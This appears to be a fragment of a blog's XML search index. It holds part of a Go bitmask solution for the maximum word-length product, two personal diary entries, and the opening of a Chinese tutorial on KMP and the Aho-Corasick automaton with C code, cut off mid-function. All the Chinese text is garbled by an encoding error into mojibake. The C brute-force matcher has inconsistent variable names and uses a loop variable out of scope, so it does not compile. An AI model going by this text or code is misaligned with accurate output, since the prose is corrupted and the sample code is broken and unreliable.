class="title">maxProduct</span><span class="params">(words []<span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">max := <span class="number">0</span></span><br><span class="line">wordsSize := <span class="built_in">len</span>(words)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; wordsSize; i++ &#123;</span><br><span class="line"><span class="keyword">for</span> j := i + <span class="number">1</span>; j &lt; wordsSize; j++ &#123;</span><br><span class="line">mask1 := <span class="number">0</span></span><br><span class="line">mask2 := <span class="number">0</span></span><br><span class="line">len1 := <span class="built_in">len</span>(words[i])</span><br><span class="line">len2 := <span class="built_in">len</span>(words[j])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m := <span class="number">0</span>; m &lt; len1; m++ &#123;</span><br><span class="line">mask1 |= <span class="number">1</span> &lt;&lt; (words[i][m] - <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> n := <span class="number">0</span>; n &lt; len2; n++ &#123;</span><br><span class="line">mask2 |= <span class="number">1</span> &lt;&lt; (words[j][n] - <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> mask1&amp;mask2 != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> len1*len2 &gt; max &#123;</span><br><span class="line">max = len1 * len2</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> max</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">words := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;ba&quot;</span>, <span class="string">&quot;bc&quot;</span>&#125;</span><br><span class="line">result := maxProduct(words)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d\n&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231204180558587.png" alt="image-20231204180558587" style="zoom: 50%;" /><p>å“ï¼Œæ—¶é—´å¤æ‚åº¦</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20231123</title>
      <link href="/2023/11/23/20231123/"/>
      <url>/2023/11/23/20231123/</url>
      
        <content type="html"><![CDATA[<p>åœ¨å¤§é©¬è·¯ä¸Šç‹‚å¥”å‘¨å›´çš„äººéƒ½å˜å¾—å¥½æ…¢ã€‚æƒ³é€ƒå‡ºå»ï¼Œå¦‚æœé€Ÿåº¦å¤§äºå…‰é€Ÿäº†å°±å¯ä»¥å›åˆ°è¿‡å»äº†ï¼Œå¯æ˜¯ä½ ä¸æƒ³å›åˆ°è¿‡å»ï¼Œä½ å“ªä¹Ÿä¸æƒ³å»ï¼Œæƒ³é€ƒå‡ºå»ã€‚</p><p>è¿åŠ¨çš„æ—¶å€™ï¼Œæ—©ç¡çš„æ—¶å€™ï¼Œæ—©èµ·å­¦ä¹ çš„æ—¶å€™ï¼Œè§‰å¾—è‡ªå·±å·²ç»åœ¨æ…¢æ…¢å˜æˆä¸€ä¸ªå¾ˆå¥½çš„äººäº†ï¼Œå·²ç»åœ¨æ…¢æ…¢é•¿å¤§äº†ï¼Œä»¥å‰å–å’–å•¡çš„æ—¶å€™æ€»å‘Šè¯‰è‡ªå·±è¿™æ˜¯æœ€åä¸€ç½äº†ï¼Œç­‰è€ƒä¸Šå¤§å­¦ï¼Œç­‰å˜å¾—æ›´å¥½äº†ï¼Œå°±å†ä¹Ÿä¸ç¢°è¿™å‚»é€¼ç©æ„ï¼Œç»“æœä½ ä¸€ç›´å–åˆ°ç°åœ¨ï¼Œå–åˆ°åï¼Œå–åˆ°æƒ³æ­»ï¼Œå–åˆ°å’–å•¡å› ä¸è€å—ï¼Œä½ ä»–å—æ‰æ˜ç™½è¿™äº›éƒ½æ˜¯ä½ å—éª—äººçš„ã€‚</p><p>ä½ ä»Šå¤©å‘Šè¯‰è‡ªå·±è¦å½“ä¸€ä¸ªå·bç‹ ç‹ çš„å­¦ä¹ ç‹ ç‹ çš„ç”Ÿæ´»æ˜å¤©å°±åœ¨åºŠä¸Šèººä¸€æ•´å¤©æ™šä¸Šåœ¨é…’é¦†é‡Œå–é…’å–åˆ°çƒ‚é†‰å–åˆ°è¯´ä¸å‡ºè¯åªä¼šä¸€ä¸ªåŠ²çš„é“æ­‰ã€‚çƒŸæŠ½äº†ä¸€æ ¹åˆä¸€æ ¹æ˜æ˜æ²¡æœ‰ç˜¾ä½†æ˜¯ä½ åœä¸ä¸‹æ¥ï¼Œä½ å°±æƒ³çŸ¥é“ä½ åˆ°åº•è¿˜å¯ä»¥çƒ‚åˆ°ä»€ä¹ˆåœ°æ­¥ã€‚</p><p>æœ‰ä¸€æ¬¡ä½ æ‰“å¼€ä¹¦å‡†å¤‡å­¦ä¹ ï¼Œåˆšæ”¾ä¸‹æ‰‹æœºä¸¤åˆ†é’Ÿæ‰‹è¡¨å¼€å§‹éœ‡åŠ¨ï¼Œä½ ä¸æƒ³å»å›é‚£äº›äººçš„å‚»é€¼æ¶ˆæ¯ï¼Œä¸æƒ³å›å¤ä»»ä½•äººçš„å…³å¿ƒï¼Œä½ åªæ˜¯æœ‰ç‚¹å›°äº†ï¼Œç¡ä¸€è§‰èµ·åºŠå°±å¯ä»¥ç»§ç»­å¥‹æ–—äº†ï¼Œè¿˜æ²¡çœŸæ­£ç¡ä¸‹å»é—¹é’Ÿå°±å“äº†ï¼Œç„¶åä½ å‘ç°äººè¿™ä¸€è¾ˆå­ä¹Ÿå°±é‚£æ ·äº†ã€‚æ€»ä»¥ä¸ºé—¹é’Ÿå“äº†å°±ç¡é†’äº†ï¼Œå°±å¯ä»¥æ´»åŠ›æ»¡æ»¡çš„å¼€å§‹ç”Ÿæ´»äº†ï¼Œåˆ°å¤´æ¥ä»€ä¹ˆéƒ½æ²¡æ”¹å˜ï¼Œé™¤äº†æ—¶é—´ä»€ä¹ˆéƒ½æ²¡æ”¹å˜ã€‚é‚£å¹²è„†æ—¶é—´ä¹Ÿåˆ«æ”¹å˜äº†ï¼Œå°±åœç•™åœ¨è¿™ä¸ªæ—¶é—´ï¼Œå°±ä¸ç”¨çœ‹ç€è‡ªå·±ä¸€ç‚¹ä¸€ç‚¹å˜å·®äº†ã€‚</p><p>è°ä»–å—æƒ³æ•´å¤©è·Ÿä¸ªæ­»äººä¸€æ ·æµ‘æµ‘å™©å™©å•Šï¼Œå……æ»¡è´Ÿé¢æƒ…ç»ªæ˜¯ä¸€ä»¶å¾ˆé…·çš„äº‹æƒ…å—ï¼Œä½ çœ‹ç€é‚£äº›è‡ªç§°æœ‰ç—…èƒ¡ä¹±åƒè¯çš„äººå°±è§‰å¾—ä»–ä»¬å¥½å¯æ€œï¼Œè¿˜å¾—é€šè¿‡è¿™ç§æ–¹å¼æ¥åšå¾—å‘¨å›´äººçš„å…³æ³¨ï¼Œæ¢å–åŒæƒ…å¿ƒï¼Œåˆ°å¤´æ¥ä½ è‡ªå·±ä¹Ÿä»–å¦ˆæ˜¯è¿™ç§äººã€‚</p><p>èº«ä½“æ˜¯ä½ è‡ªå·±çš„ä½ æ¯”è°éƒ½æ¸…æ¥šä½ è¿˜ä¸æƒ³æ­»ï¼Œä½ çœŸçš„æƒ³å˜å¾—æ›´å¥½çœŸçš„æƒ³æŠŠè‡ªå·±æƒ³æŠ“ä½çš„ä¸œè¥¿é€šé€šæŠ“ä½ï¼Œä½†äº‹å®å°±æ˜¯ä½ ä»€ä¹ˆä¹ŸæŠ“ä¸ä½ã€‚ä»¥å‰æŠ“ä¸ä½ä»¥åä¹ŸæŠ“ä¸ä½ã€‚ä½†æ˜¯ä½ çš„å­—å…¸é‡Œé¢æ²¡æœ‰åŠé€”è€ŒåºŸè¿™ä¸ªè¯´æ³•ï¼Œè¿™ä½ æ˜¯çŸ¥é“çš„ï¼Œå½“åˆå­¦ç«èµ›çš„æ—¶å€™ä½ çŸ¥é“åšæŒä¸‹å»æ­»è·¯ä¸€æ¡ä½†æ˜¯ä½ ä¸å¯èƒ½æ”¾å¼ƒï¼Œè¿™å°±æ˜¯ä½ å”¯ä¸€æ²¾æ²¾è‡ªå–œçš„ä¸œè¥¿äº†ã€‚è¿‡äº†è¿™ä¹ˆå¤šå¹´æ²¡æ‰¾åˆ°æ´»ä¸‹å»çš„æ„ä¹‰å°±å‰©ä¸€ç‚¹åæ¿€çš„å¹»æƒ³è‹Ÿæ´»ç€ä½ è§‰å¾—ä¹ŸæŒºå¯æ€œçš„ï¼Œä½†æ˜¯ä½ æ‰¾ä¸åˆ°åˆ«çš„è·¯äº†ã€‚é™¤äº†ä¸€ä¸ªåŠ²çš„å •è½ä¸€ä¸ªåŠ²çš„è…çƒ‚ä½ æ‰¾ä¸åˆ°åˆ«çš„è·¯å¯ä»¥èµ°äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è…çƒ‚çš„è¡—é“æœ‰æˆ‘å¾ˆç”œçš„å›å¿†</title>
      <link href="/2023/11/21/%E8%85%90%E7%83%82%E7%9A%84%E8%A1%97%E9%81%93%E6%9C%89%E6%88%91%E5%BE%88%E7%94%9C%E7%9A%84%E5%9B%9E%E5%BF%86/"/>
      <url>/2023/11/21/%E8%85%90%E7%83%82%E7%9A%84%E8%A1%97%E9%81%93%E6%9C%89%E6%88%91%E5%BE%88%E7%94%9C%E7%9A%84%E5%9B%9E%E5%BF%86/</url>
      
        <content type="html"><![CDATA[<p>å–å’–å•¡å–å¤šäº†ï¼Œåˆå¼€å§‹æœ‰å¾ˆä¸¥é‡çš„èº¯ä½“ååº”ã€‚åšä»€ä¹ˆäº‹æƒ…éƒ½æ€»æ˜¯åŠé€”è€ŒåºŸï¼Œè¯´å¥½äº†ä¸ç†¬å¤œä¸å–å’–å•¡ä¸å†å •è½ï¼Œå¯æ˜¯å†³å®šå¥½åšçš„äº‹æƒ…æ€»æ˜¯è¿‡å‡ å¤©å°±æ‰“ç ´ã€‚å¾ˆæƒ³å¥½å¥½ç”Ÿæ´»ï¼Œæƒ³èµ·ä»¥å‰æ— èŠä¸€æ•´å¤©ä»€ä¹ˆä¹Ÿä¸å¹²ï¼Œå‡ ä¸ªæœ‹å‹å‡‘ä¸€èµ·å»åºŸå¢Ÿæ¢é™©åªä¸ºäº†æ¶ˆç£¨é‚£å‡ ååˆ†é’Ÿçš„æ—¶é—´ã€‚å¤§æ™šä¸Šçš„ä¸€ä¸ªäººåœ¨å¾ˆç©ºæ—·å¾ˆç©ºæ—·çš„å¹³åœ°ä¸Šï¼Œæœ‹å‹éƒ½å›å»äº†ï¼Œé‚£ä¸ªæ—¶å€™è„‘å­é‡Œé¢ä»€ä¹ˆä¹Ÿæ²¡æƒ³ï¼Œå°±è¿™æ ·é€›ç€ï¼Œé™¤äº†æ—¶é—´åœ¨èµ°å…¶ä»–ä»€ä¹ˆéƒ½æ²¡å‘ç”Ÿã€‚é‚£ä¸ªæ—¶å€™å¥½åƒæ²¡æœ‰æœ‹å‹ï¼Œå°å­¦ä¹Ÿæ²¡æœ‰ï¼Œåˆä¸­æ€»ç®—æœ‰äº†å§ï¼Œé«˜ä¸­å‘¢ï¼Œæœ‹å‹å¾ˆå¤šï¼Œæœ‹å‹å¾ˆå°‘ï¼Œæƒ³è¯´å¾ˆå¤šè¯ï¼Œè¯´ä¸å‡ºå£ã€‚å·²ç»å¿˜è®°å½“æ—¶åˆ°åº•åœ¨æƒ³ä»€ä¹ˆäº†ï¼Œå¯èƒ½ä»€ä¹ˆä¹Ÿæ²¡æœ‰æƒ³å§ï¼Œåæ­£é‚£ä¸ªæ—¶å€™ä¸ä¼šæƒ³ç€è¦æŒ£å¤šå°‘é’±ï¼Œä¸ä¼šæƒ³ç€è¦æŠŠè°ç»™æ¯”ä¸‹å»ï¼Œå°±æ˜¯è§‰å¾—æ—¶é—´è¿‡çš„å¥½æ…¢ã€‚æ—¶é—´è¿‡å¾—å¥½å¿«ã€‚è‡­å¼Ÿå¼Ÿéƒ½å·²ç»è·Ÿæˆ‘ä¸€æ ·é«˜äº†ï¼Œä¼šåšæ•°å­¦é¢˜å¯ä»¥è°ˆæ‹çˆ±äº†ï¼Œæˆ‘ä¹Ÿå˜äº†ï¼Œå¿˜è®°äº†å¥½å¤šäº‹æƒ…å•Šï¼Œå¿˜è®°äº†ä»¥å‰ç¾¡æ…•ç­é‡Œæœ‰é’±äººå®¶çš„å­©å­å¹»æƒ³ç€å’Œä»–äº’æ¢èº«ä»½ï¼Œå¿˜è®°äº†å…¬å›­é‡Œé¢å¹¼ç¨šçš„å’Œæœ‹å‹åµæ¶ï¼Œå»å¥¹å®¶é‡Œå’Œå¥¹ä¸€èµ·åƒé¥­ä¸€èµ·æ´—æ¾¡ä¸€èµ·ç¡è§‰ï¼Œå¿˜è®°äº†å·å·å–œæ¬¢ä¸€éƒ¨ç”µè§†å‰§ä¸€ä¸ªæ˜æ˜Ÿä¸æ•¢å‘Šè¯‰ä»»ä½•äººï¼Œå¿˜è®°äº†åœ¨KTVé‡Œé¢å’Œä¸çŸ¥é“èƒ½ä¸èƒ½ç®—æ˜¯æˆ‘æœ‹å‹çš„ä¸¤ä¸ªäººå”±ç€å¬ä¸æ‡‚çš„éŸ©è¯­ï¼Œå†åæ¥ï¼Œè‡ªå·±ç»å†äº†é‚£äº›äº‹æƒ…ï¼Œç¬¬ä¸€æ¬¡æ— å£°çš„å“­æ³£ï¼Œç»å†äº†å¤ªå¤šäº‹æƒ…é‡è§å¤ªå¤šçš„äººï¼Œæˆ‘å¿˜è®°çš„è¶Šå¤šï¼Œå°±è¶Šæ˜¯æˆä¸ºè‡ªå·±å£ä¸­çš„çƒ‚äººã€‚ä»¥å‰çš„æ—¥è®°é‡Œå†™çš„æ€»æ˜¯æ‰€è°“çš„çˆ±æƒ…å’Œé‚£äº›æ²¡æœ‰æ„ä¹‰çš„æ„ä¹‰ï¼Œç°åœ¨çš„æ—¥è®°é‡Œé¢æ˜¯ç„¦èºå’Œéº»æœ¨å’Œæ‚”æ¨ã€‚æˆ‘åœ¨æ‚”æ¨ä»€ä¹ˆï¼Œé«˜ä¸‰ä»¥å‰çš„äººç”Ÿæˆ‘ä»ä¸æ›¾åæ‚”ä»»ä½•ä¸€ä»¶äº‹æƒ…å“ªæ€•æ˜¯é‚£ä»¶æˆ‘è‡³ä»Šäººè®°å¾—çš„ç‰¹åˆ«ç‰¹åˆ«ä¸¢è„¸çš„å°äº‹æƒ…ï¼Œå¯æ˜¯è¿™ä¸¤å¹´å‘¢ï¼Œæˆ‘è¯´ä¸ä¸Šæ¥åä¸åæ‚”ï¼Œæˆ‘åªè§‰å¾—æˆ‘èº«è¾¹è¶Šæ¥è¶Šé»‘äº†ï¼Œå¸Œæœ›æœ‰å…‰çš„æ—¶å€™ï¼Œæˆ‘å´ä½ä¸‹äº†å¤´ã€‚</p><p>å¥½åƒæœ‰å¾ˆå¤šä¸œè¥¿è¯´ä¸å‡ºæ¥ï¼Œä»–ä»¬éƒ½è¯´æˆ‘å˜äº†ï¼Œå¯æˆ‘åˆ°åº•æ€ä¹ˆå˜äº†ï¼Œæˆ‘è¿˜æ˜¯åƒåŸæ¥ä¸€æ ·ä¸€ä¸ªäººéª‘ç€è‡ªè¡Œè½¦èµ°ä¸Šé‚£äº›ç†Ÿæ‚‰çš„è¡—é“ï¼Œæˆ‘è¿˜æ˜¯åƒåŸæ¥ä¸€æ ·ç™½å¤©ç¡å¤§è§‰æ™šä¸Šæ…Œå¾—ç¡ä¸ç€èµ·åºŠæ•´å¤œæ•´å¤œçš„å­¦ä¹ ï¼Œæˆ‘è¿˜æ˜¯æ‹’ç»å¹³åº¸ã€‚æˆ‘çŸ¥é“æˆ‘å°±æ˜¯å˜äº†ã€‚</p><p>æˆ‘ä¸å†å¿«ä¹ï¼Œä¹Ÿæµä¸å‡ºæ³ªäº†ã€‚</p><p>çœ‹è§é‚£äº›è¡—é“è¢«å›´èµ·æ¥äº†ï¼Œæˆ‘ä¸çŸ¥é“åˆ°åº•è¦ä¸è¦å¸Œæœ›å®ƒè¢«å»ºè®¾çš„æ›´å¥½ï¼Œæˆ‘å°±æ˜¯å¸Œæœ›æ›¾ç»çˆ¬è¿‡çš„é‚£é“å¢™å¯ä»¥ä¸€ç›´ä¸è¢«æ¨å€’ï¼Œé‚£äº›æœ‹å‹å‘¢ï¼Œæˆ‘å¥½åƒåªè®°å¾—ä¸€ä¸ªäººçš„åå­—äº†ï¼Œé‚£ä¸ªæ—¶å€™å¥³ç”Ÿä»¬éƒ½å–œæ¬¢ä»–ï¼Œä»–ä¹Ÿå¥½åƒçœŸçš„å¾ˆè€€çœ¼ï¼Œæˆ‘æƒ³å†å›å»çœ‹çœ‹ä»–é•¿ä»€ä¹ˆæ ·å­ã€‚æˆ‘æƒ³å†å›å»çœ‹çœ‹é‚£ä¸ªæ—¶å€™çš„å¤©ç©ºæœ‰æ²¡æœ‰æ›´è“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACè‡ªåŠ¨æœº</title>
      <link href="/2023/11/21/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/"/>
      <url>/2023/11/21/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="ACè‡ªåŠ¨æœº"><a href="#ACè‡ªåŠ¨æœº" class="headerlink" title="ACè‡ªåŠ¨æœº"></a>ACè‡ªåŠ¨æœº</h2><p>ACè‡ªåŠ¨æœºæ˜¯æœ€ä¸€ç§<strong>å¤šæ¨¡å¼åŒ¹é…ç®—æ³•</strong>ï¼Œå®ƒç”±è´å°”å®éªŒå®¤çš„ä¸¤ä½ç ”ç©¶äººå‘˜Alfred V. Aho å’Œ Margaret J.Corasick äº1975å¹´å‘æ˜ï¼Œå‡ ä¹ä¸KMPç®—æ³•åŒæ—¶é—®ä¸–ï¼Œè‡³ä»Šä»ç„¶åœ¨æ¨¡å¼åŒ¹é…é¢†åŸŸè¢«å¹¿æ³›åº”ç”¨ã€‚<strong>ä¾‹å¦‚ï¼šåœ¨ä¸€ç¯‡æ–‡ç« ä¸­ï¼Œéœ€è¦æ‰¾åˆ°å¤šä¸ªè¯æ±‡æ‰€åœ¨çš„ä½ç½®å’Œå‡ºç°é¢‘ç‡ã€‚</strong></p><p>å…¶æ ¸å¿ƒç®—æ³•ä»æ˜¯<strong>å¯»æ‰¾æ¨¡å¼ä¸²å†…éƒ¨è§„å¾‹ï¼Œè¿›è¡Œæ¯æ¬¡å¤±é…çš„é«˜æ•ˆè·³è½¬</strong>ã€‚è¿™ç‚¹å’ŒKMPç®—æ³•ä¸€è‡´ï¼Œä¸åŒç‚¹åœ¨äº,ACè‡ªåŠ¨æœºå¯»æ‰¾æ¨¡å¼ä¸²çš„ç›¸åŒå‰ç¼€ã€‚</p><p>åœ¨è¿™ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹KMPç®—æ³•å’ŒTrieæ•°ã€‚</p><h3 id="KMPç®—æ³•"><a href="#KMPç®—æ³•" class="headerlink" title="KMPç®—æ³•"></a>KMPç®—æ³•</h3><h4 id="Brute-Forceç®—æ³•"><a href="#Brute-Forceç®—æ³•" class="headerlink" title="Brute-Forceç®—æ³•"></a>Brute-Forceç®—æ³•</h4><p>é¦–å…ˆä»‹ç»å­—ç¬¦ä¸²åŒ¹é…é—®é¢˜â€”â€”ç»å…¸çš„Brute-Forceç®—æ³•</p><p>å°±æ˜¯æŒ‰ç…§é¡ºåºç§»åŠ¨å­—ä¸²ï¼Œè®©å…¶å’Œä¸»ä¸²åšæ¯”è¾ƒã€‚å½“å‘ç°å­—ä¸²å’Œä¸»ä¸²å¯¹åº”ç›¸ç­‰åï¼Œå°±è¿”å›åŒ¹é…åˆ°çš„ä¸»ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ï¼ŒCè¯­è¨€å®ç°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Brute_Forece</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *text,<span class="type">const</span> <span class="type">char</span> *pattren)</span>&#123;</span><br><span class="line">    <span class="type">int</span> textLentg = <span class="built_in">strlen</span>(text);</span><br><span class="line">    <span class="type">int</span> patternLength = (<span class="built_in">strlen</span>(pattern));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>;i &lt;= textLength - patternLength;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; patternLength;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i+j] != pattern[j])&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == patternLength)&#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æ—¶é—´å¤æ‚åº¦<strong>O(mn)</strong></p></blockquote><h4 id="KMPç®—æ³•-1"><a href="#KMPç®—æ³•-1" class="headerlink" title="KMPç®—æ³•"></a>KMPç®—æ³•</h4><p>åŸç†å°±æ˜¯åœ¨è¿›è¡Œä¸€æ¬¡åŒ¹é…ä¹‹åå°±åˆæ­¥å“¦æŒ‰æ®µåç»­å‡ è¶ŸåŒ¹é…ä¸€å®šä¸ä¼šæˆåŠŸï¼Œç„¶åè·³è¿‡ï¼Œå…·ä½“åšæ³•æ˜¯ä¸ºä¸»ä¸²ä¸­æ¯ä¸€ä¸ªå­—ç¬¦æ·»åŠ ä¸€ä¸ªNextå€¼ã€‚</p><blockquote><p>nextæ•°ç»„çš„å®šä¹‰ä¸ºï¼šnext[i]è¡¨ç¤ºæ¨¡å¼ä¸²A[0]è‡³A[i]è¿™ä¸ªå­—ä¸²ï¼Œä½¿å¾—å‰kä¸ªå­—ç¬¦ç­‰äºåkä¸ªå­—ç¬¦çš„æœ€å¤§å€¼ï¼Œç‰¹åˆ«çš„kä¸èƒ½å–i+i,å› ä¸ºå­—ä¸²ä¸€å…±æ‰i+1ä¸ªå­—ç¬¦ï¼Œè‡ªå·±è·Ÿè‡ªå·±ç›¸ç­‰æ¯«æ— æ„ä¹‰ã€‚</p></blockquote><p>å¦‚ä½•é€šè¿‡nextæ•°ç»„æ¥ç¡®å®šåˆ°åº•è¦è·³å¤šå°‘æ­¥ï¼Ÿ  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸»ä¸²:[A,B,A,B,A,A,B,A,A,B,A,C]</span><br><span class="line">  |</span><br><span class="line">å­ä¸²:         [A,B,A,A,B,A,C]</span><br><span class="line">nextæ•°ç»„:[0,0,1,1,2,3,0]</span><br></pre></td></tr></table></figure><ul><li>å½“å­—ä¸²å’Œä¸»ä¸²ç¬¬ä¸€ä¸ªåŒ¹é…ä¹‹åï¼ŒæˆåŠŸåŒ¹é…ä¸Š3ä¸ªå­—ç¬¦</li><li>è¡¨ç¤ºæ€»å…±é‡å¤äº†next[3-1]&#x3D;next[2]&#x3D;1ä¸ªï¼Œäºæ˜¯ç›´æ¥è·³è¿‡ï¼šåŒ¹é…ä¸Šçš„æ¬¡æ•°-é‡å¤çš„ä¸ªæ•°&#x3D;3-1&#x3D;2æ­¥</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸»ä¸²:[A,B,A,B,A,A,B,A,A,B,A,C]</span><br><span class="line">      |</span><br><span class="line">å­ä¸²:             [A,B,A,A,B,A,C]</span><br><span class="line">nextæ•°ç»„:    [0,0,1,1,2,3,0]</span><br></pre></td></tr></table></figure><ul><li>è¿™ä¸€æ¬¡åŒ¹é…äº†6ä¸ªï¼Œå°±æ˜¯next[6-1]&#x3D;next[5]&#x3D;3</li><li>è¡¨ç¤ºé‡å¤äº†3ä¸ªï¼Œç›´æ¥è·³è¿‡6-3&#x3D;3æ­¥ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸»ä¸²:[A,B,A,B,A,A,B,A,A,B,A,C]</span><br><span class="line">            |</span><br><span class="line">å­ä¸²:                   [A,B,A,A,B,A,C]</span><br><span class="line">nextæ•°ç»„:          [0,0,1,1,2,3,0]</span><br></pre></td></tr></table></figure><ul><li>åŒ¹é…æˆåŠŸ</li></ul><blockquote><p>æ‰€ä»¥å…³é”®å°±æ˜¯å»ºç«‹nextæ•°ç»„</p></blockquote><h5 id="Nextæ•°ç»„"><a href="#Nextæ•°ç»„" class="headerlink" title="Nextæ•°ç»„"></a>Nextæ•°ç»„</h5><blockquote><p>æš´åŠ›æ„å»ºæ³•ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(m^2)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">buildNextArr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (k &lt; j &amp;&amp; pattern[k] == pattern[i - j + k]) &#123;</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k == j) &#123;</span><br><span class="line">                len = j + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        next[i] = len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>é€’æ¨æ³•æ„å»ºï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(n+m)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">buildNextRecursive</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == len) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">-1</span> || pattern[i] == pattern[j]) &#123;</span><br><span class="line">        next[i + <span class="number">1</span>] = j + <span class="number">1</span>;</span><br><span class="line">        buildNextRecursive(pattern, next, i + <span class="number">1</span>, j + <span class="number">1</span>, len);</span><br><span 